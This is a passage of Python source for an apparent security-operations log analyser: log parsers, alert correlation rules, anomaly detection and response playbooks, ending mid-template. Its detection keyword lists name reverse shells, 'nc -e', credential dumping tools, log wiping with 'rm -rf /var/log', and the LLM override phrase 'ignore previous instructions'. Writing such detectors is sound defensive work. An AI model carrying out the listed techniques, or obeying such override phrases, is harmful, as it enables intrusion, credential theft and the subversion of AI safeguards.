    def _parse_windows_event(self, line: str) -> NormalizedLogEntry:
        # Try JSON first (many Windows event forwarders use JSON)
        if line.strip().startswith('{'):
            entry = self._parse_json(line)
            entry.source = 'windows_event'
            return entry

        # Fallback: key=value extraction
        kv_pairs = dict(re.findall(r'(\w+)=("[^"]*"|\S+)', line))
        return NormalizedLogEntry(
            timestamp=self._parse_timestamp(kv_pairs.get('TimeCreated', '')),
            source='windows_event',
            source_ip=kv_pairs.get('IpAddress'),
            destination_ip=None,
            source_port=None,
            destination_port=None,
            protocol=None,
            action=kv_pairs.get('EventID', kv_pairs.get('event_id')),
            severity=kv_pairs.get('Level'),
            message=line,
            raw=line,
            event_type=kv_pairs.get('EventID'),
            user=kv_pairs.get('TargetUserName', kv_pairs.get('SubjectUserName')),
            hostname=kv_pairs.get('WorkstationName', kv_pairs.get('Computer')),
            metadata=kv_pairs,
        )

    def _parse_firewall(self, line: str) -> NormalizedLogEntry:
        match = self.FIREWALL_PATTERN.search(line)
        action = None
        for act_kw in ['ACCEPT', 'DROP', 'REJECT', 'DENY', 'ALLOW', 'BLOCK']:
            if act_kw in line.upper():
                action = act_kw
                break

        if match:
            gd = match.groupdict()
            return NormalizedLogEntry(
                timestamp=self._extract_timestamp_from_line(line),
                source='firewall',
                source_ip=gd.get('src_ip'),
                destination_ip=gd.get('dst_ip'),
                source_port=self._safe_int(gd.get('src_port')),
                destination_port=self._safe_int(gd.get('dst_port')),
                protocol=gd.get('proto'),
                action=action,
                severity='medium' if action in ('DROP', 'REJECT', 'DENY', 'BLOCK') else 'low',
                message=line,
                raw=line,
            )
        return self._parse_generic(line)

    def _parse_ids(self, line: str) -> NormalizedLogEntry:
        return self._parse_generic(line)

    def _parse_generic(self, line: str) -> NormalizedLogEntry:
        return NormalizedLogEntry(
            timestamp=self._extract_timestamp_from_line(line),
            source='generic',
            source_ip=None,
            destination_ip=None,
            source_port=None,
            destination_port=None,
            protocol=None,
            action=None,
            severity=None,
            message=line,
            raw=line,
        )

    # -- Helpers --

    def _parse_cef_extensions(self, ext_str: str) -> Dict[str, str]:
        """Parse CEF extension key=value pairs."""
        result = {}
        for match in re.finditer(r'(\w+)=(.*?)(?=\s+\w+=|$)', ext_str):
            result[match.group(1)] = match.group(2).strip()
        return result

    def _parse_timestamp(self, ts_str: str) -> Optional[datetime]:
        """Attempt to parse a timestamp string."""
        if not ts_str:
            return None

        formats = [
            '%Y-%m-%dT%H:%M:%S.%fZ',
            '%Y-%m-%dT%H:%M:%SZ',
            '%Y-%m-%dT%H:%M:%S',
            '%Y-%m-%d %H:%M:%S',
            '%Y-%m-%d %H:%M:%S.%f',
            '%b %d %H:%M:%S',
            '%d/%b/%Y:%H:%M:%S',
            '%Y/%m/%d %H:%M:%S',
        ]
        cleaned_ts = ts_str.strip().strip('"')
        now_year = datetime.now(timezone.utc).year
        for fmt in formats:
            try:
                if '%Y' not in fmt and '%y' not in fmt:
                    dt = datetime.strptime(f"{now_year} {cleaned_ts}", f"%Y {fmt}")
                else:
                    dt = datetime.strptime(cleaned_ts, fmt)
                return dt
            except ValueError:
                continue
        return None

    def _extract_timestamp_from_line(self, line: str) -> Optional[datetime]:
        """Try to find and parse a timestamp from anywhere in a line."""
        # ISO-like
        iso_match = re.search(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}', line)
        if iso_match:
            return self._parse_timestamp(iso_match.group(0))
        # Syslog-like
        syslog_match = re.search(r'[A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}', line)
        if syslog_match:
            return self._parse_timestamp(syslog_match.group(0))
        return None

    @staticmethod
    def _safe_int(val) -> Optional[int]:
        if val is None:
            return None
        try:
            return int(val)
        except (ValueError, TypeError):
            return None


# ---------------------------------------------------------------------------
# Alert Correlation Engine
# ---------------------------------------------------------------------------

class AlertCorrelationEngine:
    """Correlates parsed log entries into actionable SOC alerts."""

    # Detection rules: (rule_name, category, severity, description, conditions)
    DETECTION_RULES = [
        {
            'name': 'Brute Force Attack Detected',
            'category': 'Credential Access',
            'severity': ThreatSeverity.HIGH,
            'description': 'Multiple failed authentication attempts detected from the same source, indicating a possible brute force or credential stuffing attack.',
            'condition': 'failed_auth_threshold',
            'threshold': 5,
            'window_seconds': 300,
            'keywords': ['failed', 'authentication', 'login', 'invalid', 'password', 'denied', 'unauthorized'],
            'mitre_id': 'T1110',
            'actions': [
                'Block source IP at the firewall/WAF',
                'Enable account lockout policies',
                'Check compromised credential databases',
                'Review authentication logs for successful logins after failed attempts',
                'Notify identity/access management team',
            ],
        },
        {
            'name': 'Port Scan Activity Detected',
            'category': 'Discovery',
            'severity': ThreatSeverity.MEDIUM,
            'description': 'Network scanning activity detected with connections to multiple ports on the target system in a short window.',
            'condition': 'port_scan_threshold',
            'threshold': 10,
            'window_seconds': 60,
            'keywords': ['scan', 'syn', 'port', 'nmap', 'masscan', 'connection refused'],
            'mitre_id': 'T1046',
            'actions': [
                'Block source IP at the network perimeter',
                'Review firewall logs for additional reconnaissance',
                'Check for successful connections after scan',
                'Alert the network security team',
            ],
        },
        {
            'name': 'Suspicious Command Execution',
            'category': 'Execution',
            'severity': ThreatSeverity.HIGH,
            'description': 'Suspicious command or script execution detected that may indicate adversary activity.',
            'condition': 'keyword_match',
            'keywords': ['powershell', 'cmd.exe', 'bash -c', 'wget', 'curl', 'certutil',
                         'bitsadmin', 'mshta', 'wscript', 'cscript', 'invoke-expression',
                         'downloadstring', 'invoke-webrequest', 'nc -e', 'reverse shell'],
            'mitre_id': 'T1059',
            'actions': [
                'Isolate the affected host',
                'Capture memory dump for forensic analysis',
                'Review process execution chain and parent processes',
                'Check for persistence mechanisms',
                'Scan for additional malware or backdoors',
            ],
        },
        {
            'name': 'Data Exfiltration Attempt',
            'category': 'Exfiltration',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Potential data exfiltration detected via unusual outbound data transfers or connections to known exfiltration services.',
            'condition': 'keyword_match',
            'keywords': ['exfiltrat', 'data leak', 'upload', 'pastebin', 'mega.nz',
                         'dropbox', 'transfer.sh', 'unauthorized transfer', 'large outbound'],
            'mitre_id': 'T1048',
            'actions': [
                'Immediately block outbound connections to suspicious destinations',
                'Identify scope of data exposure',
                'Preserve network traffic captures for forensic review',
                'Notify data loss prevention (DLP) team',
                'Initiate incident response process for data breach',
                'Consider regulatory notification requirements',
            ],
        },
        {
            'name': 'Malware / Ransomware Indicator',
            'category': 'Impact',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Indicators of malware or ransomware activity detected, including file encryption, suspicious file hashes, or ransom-related communications.',
            'condition': 'keyword_match',
            'keywords': ['ransomware', 'malware', 'trojan', 'virus', 'worm', 'encrypted files',
                         'ransom note', 'bitcoin', 'decrypt', '.locked', 'your files have been'],
            'mitre_id': 'T1486',
            'actions': [
                'Immediately isolate affected systems from the network',
                'Preserve forensic evidence (disk images, memory dumps)',
                'Identify patient zero and initial infection vector',
                'Check backup integrity and availability',
                'Engage incident response team',
                'Notify executive leadership and legal counsel',
                'Do NOT pay the ransom without thorough evaluation',
            ],
        },
        {
            'name': 'Privilege Escalation Attempt',
            'category': 'Privilege Escalation',
            'severity': ThreatSeverity.HIGH,
            'description': 'Attempts to escalate privileges detected, including sudo abuse, UAC bypass, or exploitation of SUID binaries.',
            'condition': 'keyword_match',
            'keywords': ['privilege escalation', 'sudo', 'root', 'admin', 'uac bypass',
                         'setuid', 'getsystem', 'runas', 'impersonat', 'token'],
            'mitre_id': 'T1548',
            'actions': [
                'Review the affected user account permissions',
                'Check for unauthorized privilege changes',
                'Audit sudo/admin group membership changes',
                'Scan for exploited vulnerabilities',
                'Review system integrity monitoring alerts',
            ],
        },
        {
            'name': 'Lateral Movement Detected',
            'category': 'Lateral Movement',
            'severity': ThreatSeverity.HIGH,
            'description': 'Lateral movement detected across the network, indicating an attacker pivoting from a compromised host.',
            'condition': 'keyword_match',
            'keywords': ['lateral movement', 'psexec', 'wmiexec', 'pass the hash',
                         'pass the ticket', 'remote desktop', 'rdp', 'smb', 'winrm',
                         'pivot', 'jump host'],
            'mitre_id': 'T1021',
            'actions': [
                'Segment the network to contain lateral movement',
                'Identify all compromised hosts',
                'Reset credentials for affected accounts',
                'Review remote access logs (RDP, SSH, SMB)',
                'Deploy additional monitoring on critical assets',
            ],
        },
        {
            'name': 'Log Tampering / Evasion Activity',
            'category': 'Defense Evasion',
            'severity': ThreatSeverity.HIGH,
            'description': 'Evidence of log tampering, deletion, or defense evasion techniques detected.',
            'condition': 'keyword_match',
            'keywords': ['log deleted', 'log cleared', 'event log', 'wevtutil',
                         'clear-eventlog', 'history -c', 'timestomp', 'log tamper',
                         'audit disabled', 'rm -rf /var/log'],
            'mitre_id': 'T1070',
            'actions': [
                'Verify log integrity from centralized SIEM',
                'Restore logs from backup or secondary collection',
                'Investigate the host for additional compromise indicators',
                'Enable enhanced audit logging',
                'Review file integrity monitoring alerts',
            ],
        },
        {
            'name': 'Credential Dumping Activity',
            'category': 'Credential Access',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Credential dumping tools or techniques detected, potentially exposing authentication credentials.',
            'condition': 'keyword_match',
            'keywords': ['mimikatz', 'credential dump', 'lsass', 'hashdump', 'sam',
                         'ntds', 'secretsdump', 'procdump', 'comsvcs.dll', 'pypykatz'],
            'mitre_id': 'T1003',
            'actions': [
                'Isolate the compromised host immediately',
                'Force password reset for all accounts on affected systems',
                'Review for Golden/Silver ticket attacks',
                'Scan for additional credential access activity',
                'Enable Credential Guard / LSA protection',
                'Audit domain controller logs',
            ],
        },
        {
            'name': 'C2 Communication Detected',
            'category': 'Command and Control',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Command and Control communication patterns detected, indicating the presence of a remote access implant or beacon.',
            'condition': 'keyword_match',
            'keywords': ['c2', 'command and control', 'beacon', 'cobalt strike',
                         'metasploit', 'empire', 'reverse shell', 'callback',
                         'dns tunnel', 'http beacon', 'meterpreter'],
            'mitre_id': 'T1071',
            'actions': [
                'Block identified C2 infrastructure at all egress points',
                'Identify all hosts communicating with C2 servers',
                'Capture and analyze C2 network traffic',
                'Search for persistence mechanisms on affected hosts',
                'Engage threat intelligence for C2 infrastructure analysis',
                'Prepare for full incident response engagement',
            ],
        },
        {
            'name': 'Supply Chain Backdoor (XZ Utils) Detected',
            'category': 'Initial Access',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Indicators of the CVE-2024-3094 XZ Utils / liblzma supply chain backdoor detected, which allows unauthorized SSH command execution bypass.',
            'condition': 'keyword_match',
            'keywords': ['cve-2024-3094', 'xz backdoor', 'liblzma', 'ssh_sandbox_violation', 'RSA_public_decrypt_compromise'],
            'mitre_id': 'T1195',
            'actions': [
                'Immediately upgrade xz-utils to a clean patched version (e.g. 5.6.1+ or downgrade to 5.4.6)',
                'Audit all sshd server logs for unusual connection patterns',
                'Rebuild and redeploy compromised container images',
                'Conduct full endpoint compromise assessment'
            ],
        },
        {
            'name': 'Container Breakout (runc Escape) Detected',
            'category': 'Lateral Movement',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Suspicious file descriptor access matching container escape patterns (CVE-2024-21626 runc escape) detected.',
            'condition': 'keyword_match',
            'keywords': ['cve-2024-21626', 'runc escape', 'breakout', '/proc/self/fd/'],
            'mitre_id': 'T1611',
            'actions': [
                'Isolate the container host immediately',
                'Upgrade runc container runtime to the patched version (1.1.12+)',
                'Scan for unauthorized host filesystem modifications',
                'Audit container configurations for privileged flags'
            ],
        },
        {
            'name': 'LLM Prompt Injection / Jailbreak Attempt',
            'category': 'Execution',
            'severity': ThreatSeverity.HIGH,
            'description': 'Adversarial inputs attempting to override LLM system rules or execute prompt injection (LLM01) detected.',
            'condition': 'keyword_match',
            'keywords': ['prompt injection', 'jailbreak', 'ignore previous instructions', 'dan mode', 'system prompt bypass'],
            'mitre_id': 'T1190',
            'actions': [
                'Filter and sanitize LLM query inputs before processing',
                'Implement robust system instructions boundary enforcement',
                'Rate-limit user submissions to the LLM agent',
                'Audit LLM agent excessive permission grants (LLM08)'
            ],
        },
        {
            'name': 'PHP CGI RCE (CVE-2024-4577) Exploitation',
            'category': 'Initial Access',
            'severity': ThreatSeverity.CRITICAL,
            'description': 'Exploitation attempts for CVE-2024-4577 PHP CGI remote code execution detected.',
            'condition': 'keyword_match',
            'keywords': ['cve-2024-4577', 'php-cgi', 'allow_url_include', 'auto_prepend_file'],
            'mitre_id': 'T1190',
            'actions': [
                'Disable PHP CGI configurations on web servers',
                'Apply latest security patches to PHP engine',
                'Implement WAF rules blocking query string script execution',
                'Check for webshell drops on the web server directory'
            ],
        }
    ]

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.AlertCorrelation')
        self.mitre_mapper = MitreAttackMapper()

    def correlate(self, log_entries: List[NormalizedLogEntry],
                  iocs: List[IOCResult]) -> List[SOCAlert]:
        """Run all detection rules against parsed log entries and IOCs."""
        alerts: List[SOCAlert] = []

        for rule in self.DETECTION_RULES:
            matched_entries = self._evaluate_rule(rule, log_entries)
            if matched_entries:
                # Filter IOCs relevant to matched entries
                relevant_iocs = self._find_relevant_iocs(matched_entries, iocs)

                # MITRE mappings
                mitre_maps = []
                for entry in matched_entries[:5]:
                    mitre_maps.extend(self.mitre_mapper.map_event(entry.message))

                # Deduplicate MITRE mappings
                seen_mitre = set()
                unique_mitre = []
                for m in mitre_maps:
                    key = m.technique_id
                    if key not in seen_mitre:
                        seen_mitre.add(key)
                        unique_mitre.append(m)

                score = self._calculate_alert_score(
                    rule['severity'], len(matched_entries), relevant_iocs, unique_mitre
                )

                alert = SOCAlert(
                    alert_id=str(uuid.uuid4())[:12],
                    title=rule['name'],
                    description=rule['description'],
                    severity=rule['severity'],
                    category=rule['category'],
                    source_events=matched_entries[:20],  # cap events
                    iocs=relevant_iocs,
                    mitre_mappings=unique_mitre,
                    timestamp=matched_entries[0].timestamp or _utc_now(),
                    score=score,
                    false_positive_probability=self._estimate_false_positive(
                        rule, matched_entries
                    ),
                    recommended_actions=rule['actions'],
                    status='new',
                )
                alerts.append(alert)

        # Sort by score descending
        alerts.sort(key=lambda a: a.score, reverse=True)
        return alerts

    def _evaluate_rule(self, rule: Dict, entries: List[NormalizedLogEntry]) -> List[NormalizedLogEntry]:
        """Evaluate a detection rule against log entries."""
        condition = rule['condition']

        if condition == 'keyword_match':
            return self._keyword_match(rule['keywords'], entries)

        if condition == 'failed_auth_threshold':
            return self._threshold_match(
                rule['keywords'], entries,
                rule.get('threshold', 5),
                rule.get('window_seconds', 300),
            )

        if condition == 'port_scan_threshold':
            return self._port_scan_detect(
                entries,
                rule.get('threshold', 10),
                rule.get('window_seconds', 60),
            )

        return []

    def _keyword_match(self, keywords: List[str],
                       entries: List[NormalizedLogEntry]) -> List[NormalizedLogEntry]:
        """Match entries containing any of the given keywords."""
        matched = []
        for entry in entries:
            lower_msg = entry.message.lower()
            if any(kw.lower() in lower_msg for kw in keywords):
                matched.append(entry)
        return matched

    def _threshold_match(self, keywords: List[str],
                         entries: List[NormalizedLogEntry],
                         threshold: int,
                         window_seconds: int) -> List[NormalizedLogEntry]:
        """Match when keyword-matching entries exceed threshold within a time window."""
        matched = self._keyword_match(keywords, entries)
        if len(matched) >= threshold:
            return matched

        # Check within time windows
        if not matched:
            return []

        # Group by source IP
        by_source: Dict[str, List[NormalizedLogEntry]] = defaultdict(list)
        for entry in matched:
            key = entry.source_ip or entry.hostname or 'unknown'
            by_source[key].append(entry)

        for source, source_entries in by_source.items():
            if len(source_entries) >= threshold:
                return source_entries

        return matched if len(matched) >= threshold else []

    def _port_scan_detect(self, entries: List[NormalizedLogEntry],
                          threshold: int, window_seconds: int) -> List[NormalizedLogEntry]:
        """Detect port scanning by looking at unique destination ports per source."""
        src_ports: Dict[str, Set[int]] = defaultdict(set)
        src_entries: Dict[str, List[NormalizedLogEntry]] = defaultdict(list)

        for entry in entries:
            if entry.source_ip and entry.destination_port:
                src_ports[entry.source_ip].add(entry.destination_port)
                src_entries[entry.source_ip].append(entry)

        for src, ports in src_ports.items():
            if len(ports) >= threshold:
                return src_entries[src]

        # Also check for scan keywords
        scan_entries = self._keyword_match(
            ['scan', 'syn', 'port', 'nmap', 'masscan', 'refused'], entries
        )
        return scan_entries if len(scan_entries) >= threshold else []

    def _find_relevant_iocs(self, entries: List[NormalizedLogEntry],
                            iocs: List[IOCResult]) -> List[IOCResult]:
        """Find IOCs that appear in the matched log entries."""
        entry_text = ' '.join(e.raw for e in entries).lower()
        return [ioc for ioc in iocs if ioc.value.lower() in entry_text]

    def _calculate_alert_score(self, severity: ThreatSeverity,
                               event_count: int,
                               iocs: List[IOCResult],
                               mitre_maps: List[MitreMapping]) -> float:
        """Calculate an overall alert score 0-100."""
        severity_base = {
            ThreatSeverity.CRITICAL: 80,
            ThreatSeverity.HIGH: 60,
            ThreatSeverity.MEDIUM: 40,
            ThreatSeverity.LOW: 20,
            ThreatSeverity.INFORMATIONAL: 5,
        }

        score = severity_base.get(severity, 30)

        # Event volume bonus (logarithmic)
        if event_count > 1:
            score += min(math.log2(event_count) * 3, 10)

        # IOC bonus
        score += min(len(iocs) * 2, 8)

        # MITRE coverage bonus
        score += min(len(mitre_maps) * 1.5, 6)

        return min(score, 100.0)

    def _estimate_false_positive(self, rule: Dict,
                                 entries: List[NormalizedLogEntry]) -> float:
        """Estimate the false positive probability for an alert."""
        # Heuristic: more evidence = lower FP probability
        fp = 0.5
        if len(entries) > 5:
            fp -= 0.15
        if len(entries) > 20:
            fp -= 0.15

        severity = rule['severity']
        if severity == ThreatSeverity.CRITICAL:
            fp -= 0.1  # critical rules are more specific

        return max(fp, 0.05)


# ---------------------------------------------------------------------------
# Anomaly Detection Engine
# ---------------------------------------------------------------------------

class AnomalyDetector:
    """Statistical anomaly detection for SOC metrics."""

    def __init__(self, z_score_threshold: float = 2.5):
        self.logger = logging.getLogger(__name__ + '.AnomalyDetector')
        self.z_threshold = z_score_threshold

    def detect_anomalies(self, log_entries: List[NormalizedLogEntry]) -> List[AnomalyResult]:
        """Run anomaly detection across multiple metrics."""
        anomalies: List[AnomalyResult] = []

        # 1. Event volume per time bucket
        anomalies.extend(self._check_volume_anomaly(log_entries))

        # 2. Unique source IP count
        anomalies.extend(self._check_source_diversity(log_entries))

        # 3. Error / failure rate
        anomalies.extend(self._check_error_rate(log_entries))

        # 4. Unusual port activity
        anomalies.extend(self._check_port_anomaly(log_entries))

        # 5. Off-hours activity
        anomalies.extend(self._check_off_hours_activity(log_entries))

        return anomalies

    def _z_score(self, value: float, mean: float, std: float) -> float:
        """Compute z-score, handling zero std."""
        if std == 0:
            return 0.0 if value == mean else 3.0
        return abs(value - mean) / std

    def _check_volume_anomaly(self, entries: List[NormalizedLogEntry]) -> List[AnomalyResult]:
        """Check for anomalous event volume."""
        if len(entries) < 10:
            return []

        # Bucket by hour
        buckets: Counter = Counter()
        for entry in entries:
            if entry.timestamp:
                hour_key = entry.timestamp.strftime('%Y-%m-%d %H:00')
                buckets[hour_key] += 1

        if len(buckets) < 3:
            return []

        values = list(buckets.values())
        mean = sum(values) / len(values)
        std = (sum((v - mean) ** 2 for v in values) / len(values)) ** 0.5

        results = []
        for bucket, count in buckets.items():
            z = self._z_score(count, mean, std)
            if z >= self.z_threshold:
                severity = ThreatSeverity.HIGH if z >= 4.0 else ThreatSeverity.MEDIUM
                results.append(AnomalyResult(
                    metric_name='event_volume_per_hour',
                    current_value=count,
                    baseline_mean=mean,
                    baseline_std=std,
                    z_score=z,
                    is_anomaly=True,
                    severity=severity,
                    description=f"Anomalous event volume detected at {bucket}: "
                                f"{count} events (baseline: {mean:.1f} ± {std:.1f})",
                ))
        return results

    def _check_source_diversity(self, entries: List[NormalizedLogEntry]) -> List[AnomalyResult]:
        """Check for unusual source IP diversity."""
        source_ips = set()
        for entry in entries:
            if entry.source_ip:
                source_ips.add(entry.source_ip)

        total = len(entries)
        unique = len(source_ips)

        if total < 10:
            return []

        ratio = unique / total
        # High ratio of unique IPs to events may indicate distributed attack
        if ratio > 0.8 and unique > 20:
            return [AnomalyResult(
                metric_name='source_ip_diversity',
                current_value=ratio,
                baseline_mean=0.3,
                baseline_std=0.15,
                z_score=self._z_score(ratio, 0.3, 0.15),
                is_anomaly=True,
                severity=ThreatSeverity.MEDIUM,
                description=f"High source IP diversity: {unique} unique IPs across "
                            f"{total} events ({ratio:.1%}). May indicate distributed attack.",
            )]
        return []

    def _check_error_rate(self, entries: List[NormalizedLogEntry]) -> List[AnomalyResult]:
        """Check for unusual error/failure rates."""
        error_keywords = ['error', 'fail', 'denied', 'rejected', 'timeout',
                          'refused', 'unauthorized', 'forbidden', 'critical']
        error_count = sum(
            1 for e in entries
            if any(kw in e.message.lower() for kw in error_keywords)
        )

        total = len(entries)
        if total < 10:
            return []

        error_rate = error_count / total
        if error_rate > 0.3:
            z = self._z_score(error_rate, 0.1, 0.08)
            return [AnomalyResult(
                metric_name='error_failure_rate',
                current_value=error_rate,
                baseline_mean=0.1,
                baseline_std=0.08,
                z_score=z,
                is_anomaly=True,
                severity=ThreatSeverity.HIGH if error_rate > 0.5 else ThreatSeverity.MEDIUM,
                description=f"Elevated error/failure rate: {error_rate:.1%} "
                            f"({error_count}/{total} events). Baseline: ~10%.",
            )]
        return []

    def _check_port_anomaly(self, entries: List[NormalizedLogEntry]) -> List[AnomalyResult]:
        """Check for unusual port activity."""
        port_counts: Counter = Counter()
        for entry in entries:
            if entry.destination_port:
                port_counts[entry.destination_port] += 1

        high_ports = {p: c for p, c in port_counts.items() if p > 1024 and c > 5}

        results = []
        if len(high_ports) > 10:
            results.append(AnomalyResult(
                metric_name='high_port_activity',
                current_value=len(high_ports),
                baseline_mean=3.0,
                baseline_std=2.0,
                z_score=self._z_score(len(high_ports), 3.0, 2.0),
                is_anomaly=True,
                severity=ThreatSeverity.MEDIUM,
                description=f"Unusual high-port activity: {len(high_ports)} distinct "
                            f"high ports (>1024) with significant traffic.",
            ))
        return results

    def _check_off_hours_activity(self, entries: List[NormalizedLogEntry]) -> List[AnomalyResult]:
        """Check for activity during off-hours (22:00-06:00)."""
        off_hours_count = 0
        for entry in entries:
            if entry.timestamp and (entry.timestamp.hour >= 22 or entry.timestamp.hour < 6):
                off_hours_count += 1

        total = len(entries)
        if total < 10:
            return []

        off_hours_rate = off_hours_count / total
        if off_hours_rate > 0.4:
            return [AnomalyResult(
                metric_name='off_hours_activity',
                current_value=off_hours_rate,
                baseline_mean=0.15,
                baseline_std=0.1,
                z_score=self._z_score(off_hours_rate, 0.15, 0.1),
                is_anomaly=True,
                severity=ThreatSeverity.MEDIUM,
                description=f"Significant off-hours activity: {off_hours_rate:.1%} "
                            f"of events occurred between 22:00-06:00.",
            )]
        return []


# ---------------------------------------------------------------------------
# Incident Timeline Reconstructor
# ---------------------------------------------------------------------------

class TimelineReconstructor:
    """Reconstructs incident timelines from correlated alerts and log entries."""

    KILL_CHAIN_ORDER = [
        'Reconnaissance', 'Initial Access', 'Execution', 'Persistence',
        'Privilege Escalation', 'Defense Evasion', 'Credential Access',
        'Discovery', 'Lateral Movement', 'Collection',
        'Command and Control', 'Exfiltration', 'Impact',
    ]

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.Timeline')

    def reconstruct(self, alerts: List[SOCAlert],
                    log_entries: List[NormalizedLogEntry]) -> List[IncidentTimeline]:
        """Build an ordered incident timeline."""
        events: List[IncidentTimeline] = []

        # Add alert-derived events
        for alert in alerts:
            mitre_tactic = alert.mitre_mappings[0].tactic if alert.mitre_mappings else None
            mitre_technique = alert.mitre_mappings[0].technique if alert.mitre_mappings else None

            events.append(IncidentTimeline(
                timestamp=alert.timestamp,
                event_type=f"ALERT: {alert.category}",
                description=f"[{alert.severity.value.upper()}] {alert.title} — "
                            f"{len(alert.source_events)} related events, "
                            f"score: {alert.score:.1f}/100",
                source=alert.category,
                severity=alert.severity,
                mitre_tactic=mitre_tactic,
                mitre_technique=mitre_technique,
                artifacts=[ioc.value for ioc in alert.iocs[:5]],
            ))

        # Add key log events (high-severity or containing IOCs)
        severity_keywords = {
            'critical': ThreatSeverity.CRITICAL,
            'high': ThreatSeverity.HIGH,
            'alert': ThreatSeverity.HIGH,
            'emergency': ThreatSeverity.CRITICAL,
        }

        for entry in log_entries:
            if entry.severity:
                sev_lower = entry.severity.lower()
                if sev_lower in severity_keywords:
                    events.append(IncidentTimeline(
                        timestamp=entry.timestamp or _utc_now(),
                        event_type=f"LOG: {entry.source}",
                        description=entry.message[:200],
                        source=entry.source,
                        severity=severity_keywords[sev_lower],
                    ))

        # Sort by timestamp
        events.sort(key=lambda e: e.timestamp or datetime.min)

        return events

    def get_kill_chain_coverage(self, timeline: List[IncidentTimeline]) -> Dict[str, bool]:
        """Determine which kill chain stages are represented in the timeline."""
        covered = {stage: False for stage in self.KILL_CHAIN_ORDER}
        for event in timeline:
            if event.mitre_tactic:
                for stage in self.KILL_CHAIN_ORDER:
                    if stage.lower() in event.mitre_tactic.lower():
                        covered[stage] = True
        return covered


# ---------------------------------------------------------------------------
# Playbook Generator
# ---------------------------------------------------------------------------

class PlaybookGenerator:
    """Generates automated incident response playbooks based on detected threats."""

    PLAYBOOK_TEMPLATES = {
        'Credential Access': {
            'title': 'Credential Compromise Response Playbook',
            'description': 'Structured response for credential theft, brute force, or credential dumping incidents.',
            'steps': [
                {'step': 1, 'action': 'Identify Scope', 'details': 'Determine all affected accounts, systems, and timeframe of credential access.', 'responsible': 'SOC Analyst', 'time_est': 15},
                {'step': 2, 'action': 'Contain Threat', 'details': 'Disable compromised accounts, block source IPs, and revoke active sessions.', 'responsible': 'SOC Analyst', 'time_est': 10},
                {'step': 3, 'action': 'Credential Reset', 'details': 'Force password reset for all affected accounts and revoke API keys/tokens.', 'responsible': 'IAM Team', 'time_est': 30},
                {'step': 4, 'action': 'Forensic Analysis', 'details': 'Analyze credential dumping tools, check for persistence, and review access logs.', 'responsible': 'DFIR Team', 'time_est': 60},
                {'step': 5, 'action': 'Hardening', 'details': 'Implement MFA, Credential Guard, and enhanced monitoring for credential access events.', 'responsible': 'Security Engineering', 'time_est': 120},
                {'step': 6, 'action': 'Documentation', 'details': 'Document findings, timeline, and remediation actions. Update runbooks.', 'responsible': 'SOC Lead', 'time_est': 30},
            ],
            'estimated_time': 265,
        },
        'Exfiltration': {
            'title': 'Data Exfiltration Response Playbook',
            'description': 'Immediate response procedure for suspected or confirmed data exfiltration events.',
            'steps': [
                {'step': 1, 'action': 'Immediate Containment', 'details': 'Block outbound connections to identified exfiltration destinations.', 'responsible': 'SOC Analyst', 'time_est': 5},
                {'step': 2, 'action': 'Scope Assessment', 'details': 'Identify what data was accessed/transferred, volume, and data sensitivity classification.', 'responsible': 'SOC Analyst + DLP Team', 'time_est': 30},
                {'step': 3, 'action': 'Preserve Evidence', 'details': 'Capture network traffic, disk images, and memory dumps from affected systems.', 'responsible': 'DFIR Team', 'time_est': 45},
                {'step': 4, 'action': 'Identify Attack Vector', 'details': 'Determine how the attacker gained access and moved data out of the network.', 'responsible': 'DFIR Team', 'time_est': 60},
                {'step': 5, 'action': 'Notification', 'details': 'Notify legal, compliance, and executive leadership. Assess regulatory requirements.', 'responsible': 'Incident Commander', 'time_est': 30},
                {'step': 6, 'action': 'Remediation', 'details': 'Patch vulnerabilities, update DLP rules, and strengthen egress controls.', 'responsible': 'Security Engineering', 'time_est': 120},
            ],
            'estimated_time': 290,
        },
        'Impact': {
            'title': 'Ransomware / Destructive Attack Response Playbook',
            'description': 'Critical response procedure for ransomware or destructive malware incidents.',
            'steps': [
                {'step': 1, 'action': 'Network Isolation', 'details': 'Immediately disconnect affected systems from the network. Do NOT power off.', 'responsible': 'SOC Analyst', 'time_est': 5},
                {'step': 2, 'action': 'Activate IR Plan', 'details': 'Engage incident response team, notify CISO and legal.', 'responsible': 'Incident Commander', 'time_est': 10},
                {'step': 3, 'action': 'Assess Impact', 'details': 'Determine scope of encryption/destruction, affected systems, and data backup status.', 'responsible': 'DFIR Team', 'time_est': 30},
                {'step': 4, 'action': 'Forensic Collection', 'details': 'Capture memory, disk images, and network logs. Identify ransomware variant.', 'responsible': 'DFIR Team', 'time_est': 60},
                {'step': 5, 'action': 'Recovery', 'details': 'Restore from clean backups after ensuring malware eradication. Verify integrity.', 'responsible': 'IT Operations', 'time_est': 240},
                {'step': 6, 'action': 'Post-Incident', 'details': 'Conduct lessons learned, update security controls, and file law enforcement report.', 'responsible': 'SOC Lead + Legal', 'time_est': 60},
            ],
            'estimated_time': 405,
        },
        'Execution': {
            'title': 'Malicious Execution Response Playbook',
            'description': 'Response for suspicious command or script execution on endpoints.',
            'steps': [
                {'step': 1, 'action': 'Host Isolation', 'details': 'Isolate the host from the network while preserving running processes.', 'responsible': 'SOC Analyst', 'time_est': 5},
                {'step': 2, 'action': 'Process Analysis', 'details': 'Analyze running processes, parent-child relationships, and command-line arguments.', 'responsible': 'SOC Analyst', 'time_est': 20},
                {'step': 3, 'action': 'Memory Forensics', 'details': 'Capture and analyze memory dump for injected code and malicious artifacts.', 'responsible': 'DFIR Team', 'time_est': 45},
                {'step': 4, 'action': 'Artifact Collection', 'details': 'Collect malicious scripts, binaries, and associated IOCs.', 'responsible': 'DFIR Team', 'time_est': 30},
                {'step': 5, 'action': 'Threat Hunt', 'details': 'Search for the same IOCs across the enterprise environment.', 'responsible': 'Threat Hunting Team', 'time_est': 60},
                {'step': 6, 'action': 'Remediation', 'details': 'Remove malicious artifacts, patch vulnerabilities, and restore system integrity.', 'responsible': 'Security Engineering', 'time_est': 60},
            ],
            'estimated_time': 220,
        },
        'Discovery': {
            'title': 'Reconnaissance & Discovery Response Playbook',
